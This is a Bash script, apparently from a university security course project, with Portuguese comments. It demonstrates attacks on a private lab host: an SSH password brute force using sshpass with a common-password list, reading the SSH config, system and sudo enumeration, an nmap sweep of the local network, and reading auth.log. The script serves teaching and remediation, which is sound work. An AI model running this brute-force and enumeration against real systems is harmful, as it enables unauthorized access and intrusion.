#!/bin/bash

# Demo Vulnerabilidades - Trabalho Final Segurança

TARGET="192.168.3.216"
USER="apolo"

echo "="*60
echo "🔴 DEMONSTRAÇÃO DE VULNERABILIDADES CRÍTICAS"
echo "Alvo: $TARGET | Usuário: $USER"
echo "="*60
echo ""

# 1. SSH Brute Force
echo "[VULNERABILIDADE 1] SSH BRUTE FORCE ATTACK"
echo "-"*50
echo "🎯 Testando senhas comuns contra SSH..."
echo ""
for pwd in "admin" "password" "123456" "qwerty" "letmein" "welcome" "monkey" "dragon" "master" "shadow" "12345" "password123" "admin123" "root" "toor" "pass" "test" "guest" "user" "login" "abc123" "123123" "password1" "1234" "12345678" "senha" "123" "1" "2" "3" "4" "5" "6" "7" "8" "9" "123456789"; do
    echo -n "  [TESTE] Senha: '$pwd' ... "
    if result=$(sshpass -p "$pwd" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no $USER@$TARGET "echo 'ACESSO_OBTIDO'" 2>/dev/null); then
        echo "✅ SUCESSO!"
        echo "  [CRÍTICO] Senha fraca '$pwd' permitiu acesso total!"
        echo "  [EVIDÊNCIA] $result"
        SENHA_ENCONTRADA="$pwd"
        break
    else
        echo "❌ Falhou"
    fi
done
echo ""

# 2. Configuração SSH Insegura
echo "[VULNERABILIDADE 2] CONFIGURAÇÃO SSH INSEGURA"
echo "-"*50
echo "🔍 Analisando configurações perigosas..."
if ssh_config=$(ssh $USER@$TARGET "grep -E '(PermitRootLogin|PasswordAuthentication)' /etc/ssh/sshd_config" 2>/dev/null); then
    echo "  [ENCONTRADO] Configurações inseguras:"
    echo "$ssh_config" | while read line; do
        echo "    ⚠️  $line"
    done
else
    echo "  [ERRO] Não foi possível acessar configurações SSH"
fi
echo ""

# 3. Enumeração Sistema
echo "[VULNERABILIDADE 3] ENUMERAÇÃO DO SISTEMA"
echo "-"*50
echo "🕵️  Coletando informações do sistema..."
if sys_info=$(ssh $USER@$TARGET "uname -a && echo '---' && whoami && echo '---' && id" 2>/dev/null); then
    echo "  [SISTEMA] $(echo "$sys_info" | head -1)"
    echo "  [USUÁRIO] $(echo "$sys_info" | sed -n '3p')"
    echo "  [GRUPOS] $(echo "$sys_info" | tail -1)"
else
    echo "  [ERRO] Falha na coleta de informações"
fi
echo ""

# 4. Network Discovery
echo "[VULNERABILIDADE 4] DESCOBERTA DE REDE"
echo "-"*50
echo "🌐 Escaneando rede local..."
if hosts=$(nmap -sn 192.168.3.0/24 2>/dev/null | grep "Nmap scan report"); then
    echo "  [HOSTS ENCONTRADOS]:"
    echo "$hosts" | head -5 | while read line; do
        echo "    📡 $line"
    done
else
    echo "  [ERRO] Falha no scan de rede"
fi
echo ""

# 5. Privilege Check
echo "[VULNERABILIDADE 5] ESCALAÇÃO DE PRIVILÉGIOS"
echo "-"*50
echo "👑 Verificando privilégios sudo..."
if sudo_info=$(ssh $USER@$TARGET "sudo -l" 2>/dev/null); then
    echo "  [CRÍTICO] Usuário tem privilégios sudo:"
    echo "$sudo_info" | while read line; do
        echo "    🚨 $line"
    done
else
    echo "  [INFO] Acesso sudo detectado mas sem detalhes"
fi
echo ""

# 6. Log Analysis
echo "[VULNERABILIDADE 6] ANÁLISE DE LOGS"
echo "-"*50
echo "📋 Verificando logs de segurança..."
if log_info=$(ssh $USER@$TARGET "ls -la /var/log/auth.log" 2>/dev/null); then
    echo "  [LOG ENCONTRADO]:"
    echo "    📄 $log_info"
    # Mostrar últimas tentativas de login
    if recent_logins=$(ssh $USER@$TARGET "tail -3 /var/log/auth.log" 2>/dev/null); then
        echo "  [ÚLTIMAS ATIVIDADES]:"
        echo "$recent_logins" | while read line; do
            echo "    🔍 $line"
        done
    fi
else
    echo "  [ERRO] Não foi possível acessar logs"
fi

echo ""
echo "="*60
echo "⚠️  RESUMO: 6 VULNERABILIDADES CRÍTICAS DEMONSTRADAS"
echo "🔓 Acesso obtido com senha: ${SENHA_ENCONTRADA:-'N/A'}"
echo "🎯 Sistema completamente comprometido!"
echo "🔧 Execute: make correcao (para aplicar correções)"
echo "="*60